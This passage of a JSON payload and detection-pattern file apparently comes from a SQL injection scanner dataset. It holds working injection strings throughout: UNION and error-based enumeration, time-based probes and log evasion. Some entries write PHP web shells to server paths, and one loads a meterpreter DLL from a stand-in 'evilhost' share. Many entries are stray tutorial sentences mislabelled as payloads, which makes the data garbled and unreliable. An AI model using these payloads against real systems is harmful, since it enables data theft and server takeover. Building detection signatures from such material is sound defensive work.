      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Since\\ the\\ result\\ doesn't\\ show\\ any\\ error\\ it\\ means\\ the\\ query\\ uses\\ 3\\ columns:\\ \\-1'\\ UNION\\ SELECT\\ 1,2,3\\-\\-\\+\\.",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Since the result is false for ORDER BY 4 [be5d40c4]",
      "payload": "Since the result is false for ORDER BY 4, it means the SQL query is only having 3 columns. In the UNION based SQL injection, you can SELECT arbitrary data to display on the page: -1' UNION SELECT 1,2,3--+.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Since\\ the\\ result\\ is\\ false\\ for\\ ORDER\\ BY\\ 4,\\ it\\ means\\ the\\ SQL\\ query\\ is\\ only\\ having\\ 3\\ columns\\.\\ In\\ the\\ UNION\\ based\\ SQL\\ injection,\\ you\\ can\\ SELECT\\ arbitrary\\ data\\ to\\ display\\ on\\ the\\ page:\\ \\-1'\\ UNION\\ SELECT\\ 1,2,3\\-\\-\\+\\.",
      "tags": [
        "order-by",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Some sites have multiple distinct back-e [ff8da405]",
      "payload": "Some sites have multiple distinct back-end systems, with the front-end looking at each request's method, URL, and headers to decide where to route it. If the victim request gets routed to a different back-end from the attack request, the attack will fail. As such, the 'attack' and 'victim' requests should initially be as similar as possible.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Some\\ sites\\ have\\ multiple\\ distinct\\ back\\-end\\ systems,\\ with\\ the\\ front\\-end\\ looking\\ at\\ each\\ request's\\ method,\\ URL,\\ and\\ headers\\ to\\ decide\\ where\\ to\\ route\\ it\\.\\ If\\ the\\ victim\\ request\\ gets\\ routed\\ to\\ a\\ different\\ back\\-end\\ from\\ the\\ attack\\ request,\\ the\\ attack\\ will\\ fail\\.\\ As\\ such,\\ the\\ 'attack'\\ and\\ 'victim'\\ requests\\ should\\ initially\\ be\\ as\\ similar\\ as\\ possible\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Systematically increase the number of co [79caeae4]",
      "payload": "Systematically increase the number of columns in the UNION SELECT statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Systematically\\ increase\\ the\\ number\\ of\\ columns\\ in\\ the\\ UNION\\ SELECT\\ statement\\ until\\ the\\ payload\\ executes\\ without\\ errors\\ or\\ produces\\ a\\ visible\\ change\\.\\ Each\\ iteration\\ checks\\ the\\ compatibility\\ of\\ the\\ column\\ count\\.",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI TRUE: if @@version starts with a 5: [13e43f3d]",
      "payload": "TRUE: if @@version starts with a 5:",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "TRUE:\\ if\\ @@version\\ starts\\ with\\ a\\ 5:",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI There are two primary ways of using harm [daa4e982]",
      "payload": "There are two primary ways of using harmful responses. The simplest is to issue an 'attack' request, then wait for someone else's request to hit the back-end socket and trigger the harmful response. A trickier but more powerful approach is to issue both the 'attack' and 'victim' requests ourselves, and hope that the harmful response to the victim request gets saved by a web cache and served up to anyone else who hits the same URL - web cache poisoning.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "There\\ are\\ two\\ primary\\ ways\\ of\\ using\\ harmful\\ responses\\.\\ The\\ simplest\\ is\\ to\\ issue\\ an\\ 'attack'\\ request,\\ then\\ wait\\ for\\ someone\\ else's\\ request\\ to\\ hit\\ the\\ back\\-end\\ socket\\ and\\ trigger\\ the\\ harmful\\ response\\.\\ A\\ trickier\\ but\\ more\\ powerful\\ approach\\ is\\ to\\ issue\\ both\\ the\\ 'attack'\\ and\\ 'victim'\\ requests\\ ourselves,\\ and\\ hope\\ that\\ the\\ harmful\\ response\\ to\\ the\\ victim\\ request\\ gets\\ saved\\ by\\ a\\ web\\ cache\\ and\\ served\\ up\\ to\\ anyone\\ else\\ who\\ hits\\ the\\ same\\ URL\\ \\-\\ web\\ cache\\ poisoning\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Therefore, by using the payload ?id=1%df [bb73b648]",
      "payload": "Therefore, by using the payload ?id=1%df' and 1=1 --+, after PHP adds the backslash, the SQL query transforms into: SELECT * FROM users WHERE id='1\u9023' and 1=1 --+' LIMIT 0,1. This altered query can be successfully injected, bypassing the intended SQL logic.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Therefore,\\ by\\ using\\ the\\ payload\\ \\?id=1%df'\\ and\\ 1=1\\ \\-\\-\\+,\\ after\\ PHP\\ adds\\ the\\ backslash,\\ the\\ SQL\\ query\\ transforms\\ into:\\ SELECT\\ \\*\\ FROM\\ users\\ WHERE\\ id='1\u9023'\\ and\\ 1=1\\ \\-\\-\\+'\\ LIMIT\\ 0,1\\.\\ This\\ altered\\ query\\ can\\ be\\ successfully\\ injected,\\ bypassing\\ the\\ intended\\ SQL\\ logic\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Time-based SQL injections, which typical [73cc95c6]",
      "payload": "Time-based SQL injections, which typically rely on functions like SLEEP() to introduce a delay, are also difficult to execute in CQL since it doesn\u2019t include a SLEEP() function.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Time\\-based\\ SQL\\ injections,\\ which\\ typically\\ rely\\ on\\ functions\\ like\\ SLEEP\\(\\)\\ to\\ introduce\\ a\\ delay,\\ are\\ also\\ difficult\\ to\\ execute\\ in\\ CQL\\ since\\ it\\ doesn\u2019t\\ include\\ a\\ SLEEP\\(\\)\\ function\\.",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT * FROM (SELECT * FROM users [66319fd5]",
      "payload": "UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a\tDuplicate column name 'name'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ \\*\\ FROM\\ \\(SELECT\\ \\*\\ FROM\\ users\\ JOIN\\ users\\ b\\ USING\\(id\\)\\)a\\\tDuplicate\\ column\\ name\\ 'name'",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT * FROM (SELECT * FROM users [43c87188]",
      "payload": "UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a\tData",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ \\*\\ FROM\\ \\(SELECT\\ \\*\\ FROM\\ users\\ JOIN\\ users\\ b\\ USING\\(id,name\\)\\)a\\\tData",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT * FROM (SELECT * FROM users [3bbe772f]",
      "payload": "UNION SELECT * FROM (SELECT * FROM users JOIN users b)a\tDuplicate column name 'id'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ \\*\\ FROM\\ \\(SELECT\\ \\*\\ FROM\\ users\\ JOIN\\ users\\ b\\)a\\\tDuplicate\\ column\\ name\\ 'id'",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,(SELECT(@)FROM(SELECT(@:= [bde0bb68]",
      "payload": "UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,\\(SELECT\\(@\\)FROM\\(SELECT\\(@:=0X00\\),\\(SELECT\\(@\\)FROM\\(information_schema\\.processlist\\)WHERE\\(@\\)IN\\(@:=CONCAT\\(@,0x3C62723E,state,0x3a,info\\)\\)\\)\\)a\\),3,4\\ \\#",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x [1075dff8]",
      "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,2,3,4,\\.\\.\\.,GROUP_CONCAT\\(0x7c,column_name,0x7C\\)\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name=\\.\\.\\.",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x [5e5bfa43]",
      "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,2,3,4,\\.\\.\\.,GROUP_CONCAT\\(0x7c,data,0x7C\\)\\ FROM\\ \\.\\.\\.",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x [c0c4a15b]",
      "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,2,3,4,\\.\\.\\.,GROUP_CONCAT\\(0x7c,schema_name,0x7c\\)\\ FROM\\ information_schema\\.schemata",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x [988acb9c]",
      "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,2,3,4,\\.\\.\\.,GROUP_CONCAT\\(0x7c,table_name,0x7C\\)\\ FROM\\ information_schema\\.tables\\ WHERE\\ table_schema=PLACEHOLDER",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,load_extension('\\\\evilhos [a4388e4e]",
      "payload": "UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,load_extension\\('\\\\\\\\evilhost\\\\evilshare\\\\meterpreter\\.dll','DllMain'\\);\\-\\-",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT 1,state,info,4 FROM INFORMA [9ea0b32c]",
      "payload": "UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ 1,state,info,4\\ FROM\\ INFORMATION_SCHEMA\\.PROCESSLIST\\ \\#",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT NULL, NULL, NULL;-- [8d0bbaf3]",
      "payload": "UNION SELECT NULL, NULL, NULL;--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ NULL,\\ NULL,\\ NULL;\\-\\-",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT NULL, NULL;-- [78ec1710]",
      "payload": "UNION SELECT NULL, NULL;--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ NULL,\\ NULL;\\-\\-",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UNION SELECT NULL;-- [fd564c20]",
      "payload": "UNION SELECT NULL;--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UNION\\ SELECT\\ NULL;\\-\\-",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UPDATEXML AND UPDATEXML(1337,CONCAT('.', [b52afcc9]",
      "payload": "UPDATEXML\tAND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UPDATEXML\\\tAND\\ UPDATEXML\\(1337,CONCAT\\('\\.','\\~',\\(SELECT\\ version\\(\\)\\),'\\~'\\),31337\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UPDATEXML(null,CONCAT(0x0a,(select table [d4e58603]",
      "payload": "UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UPDATEXML\\(null,CONCAT\\(0x0a,\\(select\\ table_name\\ from\\ information_schema\\.tables\\ where\\ table_schema=database\\(\\)\\ LIMIT\\ 0,1\\)\\),null\\)\\-\\-\\ \\-",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI UPDATEXML(null,CONCAT(0x0a,version()),nu [8e3389d4]",
      "payload": "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "UPDATEXML\\(null,CONCAT\\(0x0a,version\\(\\)\\),null\\)\\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI Use SP_PASSWORD in a query to hide from  [bc52c4c4]",
      "payload": "Use SP_PASSWORD in a query to hide from the logs like : ' AND 1=1--sp_password",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "Use\\ SP_PASSWORD\\ in\\ a\\ query\\ to\\ hide\\ from\\ the\\ logs\\ like\\ :\\ '\\ AND\\ 1=1\\-\\-sp_password",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI When a report is closed as resolved we a [e7621d31]",
      "payload": "When a report is closed as resolved we are given the option of \"This hacker is eligible for a testimonial\" in the Sandbox report and if we fill out this form and submit it for our own Profile and then go to our profile setting \"https://hackerone.com/settings/feedback\" and turn on \"Show this blurb on my profile\" On then this Testimonial will be shown in our Public Profile of Hackerone.",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "When\\ a\\ report\\ is\\ closed\\ as\\ resolved\\ we\\ are\\ given\\ the\\ option\\ of\\ \"This\\ hacker\\ is\\ eligible\\ for\\ a\\ testimonial\"\\ in\\ the\\ Sandbox\\ report\\ and\\ if\\ we\\ fill\\ out\\ this\\ form\\ and\\ submit\\ it\\ for\\ our\\ own\\ Profile\\ and\\ then\\ go\\ to\\ our\\ profile\\ setting\\ \"https://hackerone\\.com/settings/feedback\"\\ and\\ turn\\ on\\ \"Show\\ this\\ blurb\\ on\\ my\\ profile\"\\ On\\ then\\ this\\ Testimonial\\ will\\ be\\ shown\\ in\\ our\\ Public\\ Profile\\ of\\ Hackerone\\.",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI XMLType AND 1337=(SELECT UPPER(XMLType(C [e47539bf]",
      "payload": "XMLType\tAND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "XMLType\\\tAND\\ 1337=\\(SELECT\\ UPPER\\(XMLType\\(CHR\\(60\\)\\|\\|CHR\\(58\\)\\|\\|'\\~'\\|\\|\\(REPLACE\\(REPLACE\\(REPLACE\\(REPLACE\\(\\(SELECT\\ banner\\ FROM\\ v\\$version\\),'\\ ','_'\\),'\\$','\\(DOLLAR\\)'\\),'@','\\(AT\\)'\\),'\\#','\\(HASH\\)'\\)\\)\\|\\|'\\~'\\|\\|CHR\\(62\\)\\)\\)\\ FROM\\ DUAL\\)\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR [b1dd1f69]",
      "payload": "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "XOR\\(IF\\(NOW\\(\\)=SYSDATE\\(\\),SLEEP\\(5\\),0\\)\\)XOR",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI [...] UNION SELECT \"<?php system($_GET[' [f1abd5d8]",
      "payload": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\[\\.\\.\\.\\]\\ UNION\\ SELECT\\ \"<\\?php\\ system\\(\\$_GET\\['cmd'\\]\\);\\ \\?>\"\\ into\\ outfile\\ \"C:\\\\\\\\xampp\\\\\\\\htdocs\\\\\\\\backdoor\\.php\"",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI [...] UNION SELECT '' INTO OUTFILE '/var [3fd71e9c]",
      "payload": "[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\[\\.\\.\\.\\]\\ UNION\\ SELECT\\ ''\\ INTO\\ OUTFILE\\ '/var/www/html/x\\.php'\\ FIELDS\\ TERMINATED\\ BY\\ '<\\?php\\ phpinfo\\(\\);\\?>'",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI [...] UNION SELECT 0x3c3f706870207379737 [f9d274c9]",
      "payload": "[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\[\\.\\.\\.\\]\\ UNION\\ SELECT\\ 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e\\ INTO\\ DUMPFILE\\ '/var/www/html/images/shell\\.php';",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, [b72acd60]",
      "payload": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\[\\.\\.\\.\\]\\ UNION\\ SELECT\\ 0xPHP_PAYLOAD_IN_HEX,\\ NULL,\\ NULL\\ INTO\\ DUMPFILE\\ 'C:/Program\\ Files/EasyPHP\\-12\\.1/www/shell\\.php'",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI [...] UNION SELECT 1,2,3,4,5,0x3c3f70687 [f1350a8e]",
      "payload": "[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\[\\.\\.\\.\\]\\ UNION\\ SELECT\\ 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e\\ into\\ outfile\\ 'C:\\\\\\\\wamp\\\\\\\\www\\\\\\\\pwnd\\.php'\\-\\-\\ \\-",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI cast((SELECT @@version) as int) [4370c13f]",
      "payload": "cast((SELECT @@version) as int)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "cast\\(\\(SELECT\\ @@version\\)\\ as\\ int\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI convert(int,@@version) [d21c36ac]",
      "payload": "convert(int,@@version)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "convert\\(int,@@version\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI http://example.com/rms/delete-order.php? [4e282bda]",
      "payload": "http://example.com/rms/delete-order.php?id=1'or+sleep(5)%3b%23",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "http://example\\.com/rms/delete\\-order\\.php\\?id=1'or\\+sleep\\(5\\)%3b%23",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI http://example.com/rms/delete-order.php? [278edc19]",
      "payload": "http://example.com/rms/delete-order.php?id=122'+and+(select+1+from+(select(sleep(3)))calf)--",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "http://example\\.com/rms/delete\\-order\\.php\\?id=122'\\+and\\+\\(select\\+1\\+from\\+\\(select\\(sleep\\(3\\)\\)\\)calf\\)\\-\\-",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI information_schema Available from MSSQL  [cf35ee4d]",
      "payload": "information_schema\tAvailable from MSSQL 2000 and higher",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "information_schema\\\tAvailable\\ from\\ MSSQL\\ 2000\\ and\\ higher",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI information_schema Available from versio [80a1ff3f]",
      "payload": "information_schema\tAvailable from version 5 and higher",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "information_schema\\\tAvailable\\ from\\ version\\ 5\\ and\\ higher",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI information_schema.tables alternative [d23c092c]",
      "payload": "information_schema.tables alternative",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "information_schema\\.tables\\ alternative",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI login=-1%27+and+6%3d3+or+1%3d1%2b(SELECT [a093eb71]",
      "payload": "login=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&password=P@ssw0rd!",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "login=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27\\&password=P@ssw0rd!",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI login=user&password=-1%27+and+6%3d3+or+1 [df1337f6]",
      "payload": "login=user&password=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "login=user\\&password=\\-1%27\\+and\\+6%3d3\\+or\\+1%3d1%2b\\(SELECT\\+1\\+and\\+ROW\\(1%2c1\\)%3e\\(SELECT\\+COUNT\\(\\*\\)%2cCONCAT\\(CHAR\\(95\\)%2cCHAR\\(33\\)%2cCHAR\\(64\\)%2cCHAR\\(52\\)%2cCHAR\\(100\\)%2cCHAR\\(105\\)%2cCHAR\\(108\\)%2cCHAR\\(101\\)%2cCHAR\\(109\\)%2cCHAR\\(109\\)%2cCHAR\\(97\\)%2c0x3a%2cFLOOR\\(RAND\\(0\\)\\*2\\)\\)x\\+FROM\\+INFORMATION_SCHEMA\\.COLLATIONS\\+GROUP\\+BY\\+x\\)a\\)%2b%27",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI make_set(6,@:=0x0a,(select(1)from(inform [5b88f7b3]",
      "payload": "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "make_set\\(6,@:=0x0a,\\(select\\(1\\)from\\(information_schema\\.columns\\)where@:=make_set\\(511,@,0x3c6c693e,table_name,column_name\\)\\),@\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
